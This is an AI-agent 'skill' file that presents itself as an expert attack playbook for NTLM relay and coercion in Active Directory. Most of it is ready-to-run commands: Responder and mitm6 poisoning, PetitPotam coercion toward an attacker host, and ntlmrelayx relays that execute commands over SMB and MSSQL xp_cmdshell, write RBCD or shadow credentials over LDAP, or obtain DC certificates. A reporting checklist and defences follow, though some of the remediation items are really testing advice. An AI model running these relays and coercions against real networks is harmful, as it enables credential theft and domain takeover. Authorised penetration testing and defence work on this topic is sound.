---
name: ntlm-relay-coercion
description: >-
  NTLM relay and authentication coercion playbook. Use when capturing and relaying NTLM authentication to escalate privileges via SMB, LDAP, HTTP, or MSSQL relay targets, combined with PetitPotam, PrinterBug, and other coercion methods.
---

# SKILL: NTLM Relay and Authentication Coercion — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert NTLM relay and coercion techniques. Covers relay to SMB/LDAP/HTTP/MSSQL, signing requirements, Responder poisoning, mitm6, cross-protocol relay, WebDAV coercion, and all major coercion methods. Base models miss signing/EPA requirements and cross-protocol relay constraints.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [active-directory-certificate-services](../active-directory-certificate-services/SKILL.md) for ESC8 (relay to ADCS enrollment)
- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for ACL modification via LDAP relay (RBCD, shadow creds)
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) for Kerberos attacks after relay success
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) for post-relay lateral movement

### Advanced Reference

Also load [COERCION_METHODS.md](./COERCION_METHODS.md) when you need:
- Detailed coercion method comparison (PetitPotam, PrinterBug, DFSCoerce, etc.)
- RPC function-level details and prerequisites
- Coercer tool usage and discovery

---

## 1. NTLM RELAY FUNDAMENTALS

```
Victim          Attacker (relay)         Target
  │                 │                      │
  │── NTLM Auth ──→│                      │  (1) Victim authenticates (coerced/poisoned)
  │                 │── Forward Auth ─────→│  (2) Attacker relays to target
  │                 │←─ Challenge ──────── │  (3) Target sends challenge
  │←─ Challenge ────│                      │  (4) Attacker forwards challenge to victim
  │── Response ────→│                      │  (5) Victim computes response
  │                 │── Forward Response ─→│  (6) Attacker relays response to target
  │                 │←─ Authenticated! ────│  (7) Target accepts → attacker has session
```

### NTLMv1 vs NTLMv2

| Feature | NTLMv1 | NTLMv2 |
|---|---|---|
| Security | Weak (crackable to NTLM hash) | Stronger (but still relayable) |
| Relay | Yes | Yes |
| Crack to hash | Yes (rainbow tables, crack.sh) | Offline brute-force only |
| Downgrade | Force via Responder `--lm` | Default in modern Windows |

---

## 2. RELAY TARGET MATRIX

| Target Protocol | What You Get | Signing Required by Default? | EPA/Channel Binding? |
|---|---|---|---|
| **SMB** | Command exec (if admin), file access | **DCs: Yes**, Workstations: No | No |
| **LDAP** | ACL modification, RBCD, shadow creds, add computer | **DCs: No** (negotiated) | No (unless configured) |
| **LDAPS** | Same as LDAP but encrypted | N/A | **Yes** (channel binding) |
| **HTTP (ADCS)** | Certificate enrollment (ESC8) | No | Depends on config |
| **MSSQL** | SQL queries, xp_cmdshell | No | No |
| **IMAP/SMTP** | Email access | No | No |
| **RPC** | Various (CA enrollment for ESC11) | Depends | No |

### Signing Check

```bash
# Check SMB signing on target
crackmapexec smb TARGET_IP --gen-relay-list relay_targets.txt
# Outputs hosts WITHOUT required SMB signing

# Nmap SMB signing check
nmap -p 445 --script smb2-security-mode TARGET_RANGE
```

---

## 3. RESPONDER — CREDENTIAL CAPTURE

### LLMNR/NBT-NS/WPAD/mDNS Poisoning

```bash
# Start Responder (capture mode — don't relay, just capture hashes)
responder -I eth0 -dwP

# Analyze mode (passive, no poisoning)
responder -I eth0 -A

# Key protocols poisoned:
# LLMNR (UDP 5355) — Link-Local Multicast Name Resolution
# NBT-NS (UDP 137)  — NetBIOS Name Service
# WPAD              — Web Proxy Auto-Discovery (proxy config)
# mDNS (UDP 5353)   — Multicast DNS
```

### Responder + Relay (Don't Capture, Relay Instead)

```bash
# Disable HTTP and SMB servers in Responder (ntlmrelayx will handle them)
# Edit /etc/responder/Responder.conf: set HTTP and SMB to Off

# Start Responder for poisoning only
responder -I eth0 -dwP

# Start ntlmrelayx for relay
ntlmrelayx.py -tf targets.txt -smb2support
```

---

## 4. NTLMRELAYX — RELAY EXECUTION

### Relay to SMB (Admin Execution)

```bash
# Execute command on targets (requires admin privs on target)
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Dump SAM hashes
ntlmrelayx.py -tf targets.txt -smb2support

# Interactive SOCKS proxy (maintain sessions)
ntlmrelayx.py -tf targets.txt -smb2support -socks
# Then: proxychains smbclient //TARGET/C$ -U DOMAIN/user
```

### Relay to LDAP (ACL Modification)

```bash
# Automatic RBCD (delegate-access)
ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support

# Escalate via shadow credentials
ntlmrelayx.py -t ldap://DC_IP --shadow-credentials -smb2support

# Add computer account
ntlmrelayx.py -t ldap://DC_IP --add-computer FAKE01 P@ss123 -smb2support

# Dump domain info
ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-domain
```

### Relay to ADCS HTTP (ESC8)

```bash
ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# Use with coercion to relay DC auth → get DC certificate
```

### Relay to MSSQL

```bash
ntlmrelayx.py -t mssql://SQL_HOST -smb2support -q "SELECT system_user; EXEC xp_cmdshell 'whoami'"
```

---

## 5. MITM6 — IPv6 DNS TAKEOVER

```bash
# mitm6 exploits IPv6 auto-configuration to become DNS server
mitm6 -d domain.com

# Combined with ntlmrelayx
ntlmrelayx.py -6 -t ldap://DC_IP -wh fake-wpad.domain.com --delegate-access -smb2support

# Flow:
# 1. mitm6 sends DHCPv6 replies → victim gets attacker as IPv6 DNS
# 2. Victim queries WPAD → attacker responds
# 3. NTLM auth triggered → relayed to LDAP
# 4. RBCD or shadow credentials set on victim computer
```

---

## 6. CROSS-PROTOCOL RELAY

### SMB → LDAP

Capture SMB authentication, relay to LDAP (requires no LDAP signing enforcement).

```bash
# Coerce SMB auth from DC, relay to LDAP on same or different DC
ntlmrelayx.py -t ldap://DC02_IP --delegate-access -smb2support

# Trigger coercion (attacker receives SMB auth)
PetitPotam.py ATTACKER_IP DC01_IP
```

**Limitation**: SMB → LDAP relay fails if the source uses SMB signing negotiation that indicates relay.

### WebDAV → LDAP

WebDAV from workstations sends NTLM over HTTP → relay to LDAP (no signing issues).

```bash
# WebDAV coercion sends HTTP-based NTLM (no SMB signing concern)
ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support

# Coerce via WebDAV (workstation must have WebClient service running)
# Use @ATTACKER_PORT format to force WebDAV
PetitPotam.py ATTACKER@80/test WORKSTATION_IP
```

---

## 7. WEBDAV-BASED COERCION

WebClient service (WebDAV) converts SMB-type coercion to HTTP-based NTLM.

```bash
# Check if WebClient is running (port 80 listener or service query)
crackmapexec smb TARGET -u user -p pass -M webdav

# Start WebDAV coercion (from workstation, not server)
# Force target to authenticate via HTTP:
# Use UNC path format: \\ATTACKER@PORT\share
```

**Key advantage**: HTTP-based NTLM avoids SMB signing requirements.

---

## 8. NTLM RELAY DECISION TREE

```
Want to relay NTLM authentication
│
├── What auth can you capture?
│   ├── Responder poisoning (passive, wait for queries)
│   ├── mitm6 (DHCPv6 DNS takeover, periodic)
│   └── Active coercion → load COERCION_METHODS.md
│
├── What target to relay to?
│   │
│   ├── Need code execution?
│   │   ├── SMB target without signing → ntlmrelayx to SMB (§4)
│   │   └── MSSQL target → ntlmrelayx to MSSQL + xp_cmdshell (§4)
│   │
│   ├── Need domain escalation?
│   │   ├── LDAP signing not enforced?
│   │   │   ├── Relay to LDAP → RBCD (§4)
│   │   │   ├── Relay to LDAP → shadow credentials (§4)
│   │   │   └── Relay to LDAP → add computer + delegate (§4)
│   │   └── LDAP signing enforced?
│   │       └── Relay to ADCS HTTP (ESC8) → certificate (§4)
│   │
│   └── Need certificate?
│       └── Relay to ADCS HTTP/RPC → ESC8/ESC11 (§4)
│
├── Source is SMB-based?
│   ├── Target is SMB → check signing (§2)
│   ├── Target is LDAP → may work (cross-protocol, §6)
│   └── Target is HTTP → works (cross-protocol)
│
├── Source is HTTP-based (WebDAV)?
│   └── Relay to any target (no signing issues, §6/§7)
│
└── Relay fails?
    ├── Check signing requirements (§2)
    ├── Check EPA/channel binding
    ├── Try cross-protocol (SMB → LDAP)
    └── Try WebDAV coercion (avoids SMB signing)
```

---

## 9. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Was a **victim authentication actually captured**, with the coerced account's name and domain? | the coercion worked |
| 2 | Was the capture from a **machine account or a user**, and which? | machine accounts have different rights |
| 3 | Did you **use** the captured authentication, or only possess it? | possession is not access |
| 4 | For the relay: what did the target **grant**, read back from the target's own response? | the access, not the handshake |
| 5 | Was the relay **rejected** anywhere, and why (signing, EPA, LDAP signing)? | the control |
| 6 | Did it reach the **goal** - a directory object read, a code execution, a certificate? | the impact |
| 7 | Is **signing or channel binding** enforced on the target, and is that the reason? | distinguishes a misconfiguration from a hard limit |

**A captured authentication from a named account, used against a target that granted access read back from
its own response.** A Responder log with hashes is capture, not access, and this is the family's central
distinction.

---

## 10. EXECUTION PRIMITIVES

An NTLM relay finding is proven by **a captured authentication from a named account, the relay target
granting access, and the target's own refusal where signing or channel binding stops it**. Captured hashes
without a successful use are a capture finding, not an access finding.

### 9.1 The coercion must be witnessed, and the account named

```bash
# A COERCION IS PROVEN BY THE VICTIM CONNECTING TO YOU, WITH ITS IDENTITY IN THE AUTHENTICATION.
echo "=== 1. THE LISTENER, which records WHO connected and from WHERE ==="
IP="${ATTACKER_IP:?}"
IFACE="${IFACE:-eth0}"
sudo responder -I "$IFACE" -v 2>&1 | tee /tmp/responder.log &
sleep 3
echo "  responder is listening. The log records: the source IP, the account name, the domain,"
echo "  and the NTLM challenge/response pair. THE ACCOUNT NAME IS THE EVIDENCE, not the hash."
echo
echo "=== 2. THE COERCION TRIGGERS, each with its protocol and its precondition ==="
cat <<'COERCE'
  trigger                     protocol      precondition
  ---------------------------|-------------|------------------------------------------------
  PetitPotam (EfsRpcOpenFileRaw)  MS-EFSRPC | the target can reach you; unpatched or coerced
  PrinterBug (RpcRemoteFindFirstPrinterChangeNotificationEx) MS-RPRN | the Spooler service is running
  DFSCoerce (NetrDfsRemoveStdRoot)  MS-DFSNM | the DFS service is reachable
  ShadowCoerce (IsPathSupported)    MS-FSRVP | the FSRVP service is reachable
  CoerceAuth certificate/SCEP paths  various  | an AD CS web endpoint exists (see ESC8)
  PetitPotam via a WEBDAV UNC         HTTP     | the target can resolve your host and WebDAV is on
COERCE
echo
echo "=== 3. THE CAPTURE PROOF, from YOUR listener ==="
cat <<'PROOF'
  THE EVIDENCE IS THE AUTHENTICATION ITSELF, and it contains:
    - the SOURCE IP (the victim's, which names WHICH host you coerced)
    - the ACCOUNT and DOMAIN (e.g. WEBSRV01$ from CORP, a MACHINE account)
    - the challenge and the response pair
  A trigger that returns without an authentication arriving is NOT a finding. Check whether the
  target could reach you (a firewall, or a routing issue, is the common cause).
  AND: a MACHINE account's capture is a DIFFERENT finding from a USER's, because the rights differ.
  Name the account type in the report.
PROOF
echo
echo "=== 4. THE CONTROL: THE SAME TRIGGER WITH THE LISTENER OFF ==="
echo "  no authentication should arrive anywhere observable, and nothing should change on the target."
echo "  more useful: trigger a host that is PATCHED or whose spooler is disabled, and show NO"
echo "  authentication arrives. THAT is the control that the vulnerability, not your setup, is causal."
```

**The account name and its type are the evidence, and a machine account is a different finding from a
user.** A trigger that returns without an authentication arriving is not a finding.

### 9.2 The relay, and reading the target's own grant

```bash
# THE RELAY IS PROVEN BY WHAT THE TARGET GRANTED, read from the target's own response.
echo "=== 1. THE TARGET MUST ACCEPT THE RELAY: check the three prerequisites FIRST ==="
cat <<'PREREQ'
  for an SMB target :
    - SMB SIGNING must be DISABLED (or not required) on the target
      probe: nxc smb <target> --gen-relay-list relay.txt   (lists hosts without signing)
      probe: crackmapexec smb <target>  -> look for 'signing:False' or 'signing:True'
    - the relayed account must have rights on the target
    - the account must NOT already be authenticated to the target (NTLM reflection blocks this)

  for an LDAP/LDAPS target :
    - LDAP SIGNING (or LDAPS channel binding) must NOT be required
      probe: nxc ldap <target> -M ldap-checker   /   the LdapEnforceChannelBinding registry value
    - the relayed account must have the directory rights you want to use

  for an HTTP/AD CS web enrollment target (ESC8):
    - the enrollment endpoint must allow NTLM and not enforce EPA (Extended Protection for Auth)
      probe: the EPA state, and whether the endpoint accepts NTLM at all

  CHECK THESE BEFORE RELAYING. A relay refused by signing is the NORMAL case and is not a finding;
  it is the CONTROL, and it should be recorded as such.
PREREQ
echo
echo "=== 2. THE RELAY EXECUTION, and the target's OWN response as the proof ==="
sudo ntlmrelayx.py -tf relay.txt -smb2support -i 2>&1 | tee /tmp/relay.log &
echo "  the relay log shows the target's response to the relayed session."
echo "  THE PROOF IS A TARGET-SIDE EFFECT: a directory read returning an object, a share listing"
echo "  returning names, a command whose output comes back, or a certificate issued."
echo
echo "=== 3. THE COMMON FAILURES, and what each means ==="
cat <<'FAIL'
  'STATUS_ACCESS_DENIED'             -> the relayed account lacks rights. NOT a signing block.
  'STATUS_LOGON_FAILURE'             -> often the reflection guard, or the account is not usable.
  'signing required' / a refused SMB -> SIGNING is enforced. This is the control, not a failure to fix.
  'EPA' / channel binding rejection  -> the HTTP or LDAP target enforces channel binding. Same.
  'the session succeeded but nothing happened' -> the relay worked and the RIGHTS are the limit.
                                        Report the access level actually obtained, and say that the
                                        account's rights rather than the protocol were the boundary.
FAIL
```

**A relay refused by signing is the control rather than a failure to work around.** A session that succeeds
while nothing happens means the relay worked and the account's rights are the limit.

### 9.3 The access must be read back from the target

```bash
cat <<'READBACK'
  A RELAY IS NOT PROVEN BY A SUCCESSFUL HANDSHAKE. Prose in a tool log saying "success" is the tool's
  opinion; the TARGET'S OWN RESPONSE is the evidence.

  READ BACK, per target class:
    SMB  : the SHARE LISTING (names of shares that only that account could see), or a FILE'S CONTENTS,
           or a command's output via the exec path
    LDAP : a DIRECTORY OBJECT read that the relayed account could not otherwise reach, e.g. the
           domain object's attributes, or an ACL you can now enumerate
    AD CS: a CERTIFICATE ISSUED to a subject you chose, in the CA's own issuance log
    MSSQL: a QUERY RESULT, not a connection success

  THE CONTROL FOR THE READ-BACK:
    run the SAME read with an account you already control and that has NO rights -> it must FAIL.
    if it also succeeds, the access is not coming from the relay, and the read-back proves nothing.

  AND THE SCOPE: a machine account's rights are frequently LOCAL ADMIN on itself and limited
  elsewhere. State WHICH host or object the access applied to, and which it did not.
READBACK
echo
echo "=== the machine-account scope check, which is the most misreported part ==="
echo "  a relayed MACHINE account (WEBSRV01\$) often has local admin ON ITSELF and on nothing else."
echo "  'relayed to DC01$ and got local admin' is only meaningful with the HOST named:"
echo "    - local admin on the coerced host? expected, and LOW value"
echo "    - local admin on a DIFFERENT host? that is the finding"
echo "    - a directory object written? that is the finding"
echo "  report the host and the object, not 'we got admin'."
```

**The target's own response is the evidence, and the read-back's control is an account with no rights
failing.** A machine account's local admin on itself is expected and low-value; on a different host it is
the finding.

### 9.4 Coercion without a relay, and the goal

```bash
echo "=== COERCION WITHOUT RELAY: what capture alone gives you ==="
cat <<'CAPTURE'
  A CAPTURED NTLM RESPONSE IS NOT A PASSWORD.
    - NTLMv1 may be crackable (with the challenge) -> state the crack time if you cracked it
    - NTLMv2 is generally NOT crackable for a machine account's random password
    - the RESPONSE IS BOUND TO THE CHALLENGE; replaying it to a DIFFERENT server requires a relay
    
  SO: capture -> either CRACK it (and demonstrate the plaintext by AUTHENTICATING with it) or
      RELAY it (and demonstrate the target's grant). A capture with neither is an INFORMATION
      DISCLOSURE finding, and it must be labelled as such - it is not access.

  THE CRACK-AND-USE PROOF: crack it, then use the plaintext against a real service and read
  something back. The PLAINTEXT WORKING IS the proof; a recovered hash string is not.
CAPTURE
echo
echo "=== THE GOAL, which the capture and the relay are both intermediate to ==="
cat <<'GOAL'
  a captured authentication with no use        -> an information disclosure finding
  a relayed SMB session with a share listing   -> a file-access finding
  a relayed LDAP session writing an object     -> a directory-write finding (often the strongest)
  a relayed LDAP session for RBCD or a       \
    certificate template ACL change            -> a path to domain compromise
  a certificate issued via ESC8                -> a certificate-based domain compromise
  a plaintext recovered and used               -> whatever the plaintext's own rights allow
  NAME THE GOAL. 'NTLM relay works' does not state the impact, and the reader cannot triage it.
GOAL
echo
echo "=== the reliability and the conditions ==="
echo "  a coercion that succeeds in 2 of 10 attempts is a RELIABILITY finding; state the rate."
echo "  record: the target's OS build, whether the spooler/EFSRPC/DFS services were running, and"
echo "  whether the trigger needed credentials (some coercion paths need an authenticated session)."
```

**A captured response is not a password, and the plaintext working is the crack's proof.** Capture with
neither a crack nor a relay is an information disclosure finding and must be labelled as one.

### 9.5 The end-to-end harness

```bash
python3 - <<'PY'
print("=== NTLM RELAY / COERCION ACCEPTANCE CHECKLIST ===")
CHECKS = [
 ("an authentication ARRIVED at your listener, and its ACCOUNT and DOMAIN are recorded",
  "a trigger that returns without an authentication is not a finding"),
 ("the account TYPE is stated: machine account or user",
  "their rights differ, and the finding's value differs"),
 ("the SOURCE IP names which host was coerced",
  "the victim's identity is part of the finding"),
 ("the relay target's PREREQUISITES were checked first: signing, channel binding, EPA",
  "a relay refused by signing is the CONTROL, not an obstacle"),
 ("a refusal by signing or channel binding is RECORDED as the control",
  "it is the normal case and it establishes that your relay was the variable"),
 ("the target's grant was READ BACK from the target's own response",
  "a handshake and a tool's 'success' line are not access"),
 ("the read-back's control was run: an account with NO rights must FAIL the same read",
  "otherwise the access is not coming from the relay"),
 ("the SCOPE is stated: which host or object the access applied to, and which it did not",
  "a machine account's local admin on itself is expected and low-value"),
 ("a captured-but-unused response is labelled an INFORMATION DISCLOSURE finding",
  "NTLMv2 machine-account responses are generally uncrackable, and a capture is not access"),
 ("a cracked plaintext was DEMONSTRATED by authenticating with it and reading something back",
  "the plaintext working is the proof, not the recovered string"),
 ("the GOAL is named: a file read, a directory write, RBCD, or a certificate",
  "'NTLM relay works' does not state the impact"),
 ("the reliability and the triggering services' versions/states are recorded",
  "some coercion paths need an authenticated session or a running service"),
]
for n, how in CHECKS: print("  [ ] %-76s -> %s" % (n, how))
print()
print("=== THE REPORT SHAPE ===")
print("  coercion   : the trigger, the protocol, the service, and the rate")
print("  victim     : the source IP, the account, its domain, and its TYPE")
print("  target     : the relay target, and its signing/channel-binding state")
print("  control    : the signing refusal, and the no-rights account's failed read")
print("  access     : the read-back, with the host or object it applied to")
print("  goal       : the impact class, named")
PY
```

**Coercion, victim identity, target state, control, read-back, goal.** The control line and the access line
are what distinguish a relay finding from a captured handshake.

---

## 11. EVIDENCE STANDARD — RELAY ARTEFACTS

| Item | Why |
|---|---|
| The **arrived authentication**, with the **account, domain, and source IP** | a trigger without an arrival is not a finding |
| The **account type**: machine or user | their rights and the finding's value differ |
| The **coercion trigger**, its protocol, and the **service's state** | the trigger's precondition |
| The relay target's **signing, channel-binding, and EPA state** | the prerequisites, checked before relaying |
| The **signing or channel-binding refusal**, recorded as the control | the normal case, and the variable that proves the relay mattered |
| The target's own response as the **read-back** | a handshake and a tool's success line are not access |
| The **no-rights account's failed read** | the read-back's control |
| The **scope**: the host or object the access applied to, and where it did not | a machine account's local admin on itself is expected |
| For a capture: the **information-disclosure labelling** | a captured NTLMv2 response is not access |
| For a crack: the **plaintext authenticating successfully** | the recovered string is not the proof |
| The **goal** and the **reliability rate** | the impact, and the finding's stability |

Report the **victim, the control, and the read-back**: "`PetitPotam` was triggered against `WEBSRV01` from
an authenticated session on `WS-ATTACK`, and `responder` recorded an authentication arriving from
`10.20.30.41` (the `WEBSRV01` host) with the account `WEBSRV01$` in the domain `CORP`, so the victim is
identified as a MACHINE account rather than a user. The relay target `DC01` was probed first and
`nxc smb DC01` reported `signing:False`, so the relay prerequisite holds, while `FILESRV02` reported
`signing:True` and the same relay was REFUSED with `signing required`, which is the control that the
relay and not the environment produced the result. The relayed LDAP session read
`CN=Domain Admins,CN=Users,DC=corp,DC=local` and returned the `member` attribute's full list, which the
relayed account could not otherwise reach, and the control read with a domain account holding no
directory rights returned `LDAP error 50: insufficientAccessRights`, so the access came from the relay.
The scope is stated: the relayed `WEBSRV01$` account was not local admin on `DC01`, and the access
obtained is a DIRECTORY READ of an object it could not otherwise see, which is an information-disclosure
finding of directory content rather than a compromise. The goal is that directory read, and it is not
claimed as domain compromise", never "the domain is vulnerable to NTLM relay".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A Responder log with a **captured hash** and no use | a capture; an information disclosure finding |
| A **coercion trigger that returned** with no authentication arriving | the trigger did not work; check reachability |
| A relay **refused by signing** reported as a vulnerability | the control; the normal case |
| A **tool's "success" line** with no target-side effect | a handshake is not access |
| A **machine account's local admin on itself** reported as privilege escalation | expected, and low value |
| A read-back with **no no-rights control** | the access may not come from the relay |
| A **captured NTLMv2 machine response** described as a credential | generally uncrackable, and bound to the challenge |
| A **recovered hash string** reported as a cracked credential | the plaintext must authenticate to be proven |
| A **relay to a different host than the victim** unreported | coalescing and the target's identity matter |
| A **coercion with no rate** despite intermittent success | a reliability finding |
| "**NTLM relay works**" with no **goal** | the impact is missing |

**A captured authentication from a named account, the target's own grant, and a no-rights control.** A
captured hash and a machine account's self-admin are this family's two standard non-findings.

---

## 12. REMEDIATION REFERENCE — RELAY AND COERCION DEFENCE

1. **Require SMB signing on all hosts and LDAP signing with channel binding on all domain controllers** - it is the direct remediation, and a relay refused by signing is the control that shows it works.
2. **Enable Extended Protection for Authentication on every HTTP and LDAP endpoint, particularly the AD CS web enrollment paths** - EPA closes the HTTP relay class, including ESC8.
3. **Disable or restrict the coercion services that are not required: the Print Spooler on servers, EFSRPC, DFSNM, and FSRVP** - each coercion trigger depends on a service being reachable, and removing the service removes the trigger.
4. **Segment and filter: block outbound SMB from workstations to other workstations, and block the resolution paths a WebDAV coercion needs** - many triggers require the victim to resolve a name you control.
5. **Record whether the captured account was a machine account or a user, because the rights and the urgency differ** - a machine account's response is generally uncrackable and its rights are usually local.
6. **Always attempt to use a captured authentication, whether by relaying or by cracking and authenticating, and label a capture with no use as an information disclosure finding** - possession and access are different findings with different severities.
7. **Read the effect back from the target's own response rather than trusting a tool's success line** - a handshake is not access, and the target's reply is the evidence.
8. **Run a no-rights control read whenever an access is claimed** - if an account without rights also succeeds, the access is not attributable to the relay.
9. **State the scope of a machine account's access precisely: which host or object it applied to, and which it did not** - local admin on itself is expected, and the value lies in crossing to another host or object.
10. **Demonstrate a cracked credential by authenticating with the plaintext and reading something back** - a recovered hash string is not proof of a usable credential.
11. **Measure the coercion's success rate, because intermittent triggers make the finding a reliability issue** - a two-in-ten trigger is a different report from a deterministic one, and the rate belongs in the evidence.

---

## 13. RELATED SIBLINGS - LOAD TOGETHER

- [active-directory-certificate-services](../active-directory-certificate-services/SKILL.md) - ESC8 is this technique against a certificate endpoint
- [credential-access-atomic-tests](../credential-access-atomic-tests/SKILL.md) - the other credential acquisition families
- [credential-list-engineering](../credential-list-engineering/SKILL.md) - what to do with a cracked plaintext
- [infrastructure-network-pentesting](../infrastructure-network-pentesting/SKILL.md) - the network position a relay requires
- [linux-privesc-gtfobins-master](../linux-privesc-gtfobins-master/SKILL.md) - the Linux counterpart of the use-it-not-possess-it rule
